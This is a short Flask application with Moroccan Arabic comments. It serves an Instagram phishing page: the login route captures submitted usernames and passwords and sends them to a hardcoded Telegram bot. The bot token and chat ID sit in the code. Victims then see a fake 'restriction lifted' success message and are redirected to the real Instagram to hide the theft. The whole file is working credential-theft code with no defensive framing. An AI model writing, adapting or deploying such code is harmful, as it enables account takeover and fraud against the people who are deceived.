from flask import Flask, request, render_template
import requests # هاد المكتبة هي البوسطاجي ديالنا

app = Flask(__name__)

# ----------------------------------------------------
# حط الساروت ديال البوت والرقم ديالك هنا بين المزدوجتين
TELEGRAM_TOKEN = "8929378500:AAFLKCsCmRsPHMN76LtH8A1uKe4Q-QLEMYg"
CHAT_ID = "7896623394"
# ----------------------------------------------------

# هادي فنكسيون صغيرة خدمتها هي تصيفط ميساج لتيليغرام
def send_to_telegram(user, pwd):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    message = f"🚨 محاولة دخول جديدة!\n\n👤 اليوزر: {user}\n🔑 الباسورد: {pwd}"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print("خطأ في إرسال الرسالة لتيليغرام:", e)

# الصفحة الرئيسية
@app.route('/')
def home():
    return render_template('index.html')

# ملي شي حد كيكليكلي على Log In
@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pwd = request.form.get('password')

    print("=====================================")
    print(f"[*] الإيميل/اليوزر: {user}")
    print(f"[*] كلمة السر: {pwd}")
    print("=====================================")

    # هنا كنعيطو للبوسطاجي باش يصيفط ليك الميساج لتيليغرام
    send_to_telegram(user, pwd)

    # ومباشرة كنطلعو ليه ميساج النجاح ونوجهوه لانستغرام الحقيقي
    return f"""
    <html>
    <head>
        <meta charset="UTF-8">
        <title>تم بنجاح</title>
    </head>
    <body style="font-family: Arial; text-align: center; margin-top: 100px; background-color: #FAFAFA;">
        <h1 style='color: green;'>تم فك التقييد بنجاح!</h1>
        <p style='color: #8e8e8e;'>جاري توجيهك لحسابك في انستغرام...</p>
        <script>
            setTimeout(function() {{
                window.location.href = "https://www.instagram.com";
            }}, 3000);
        </script>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(port=5000)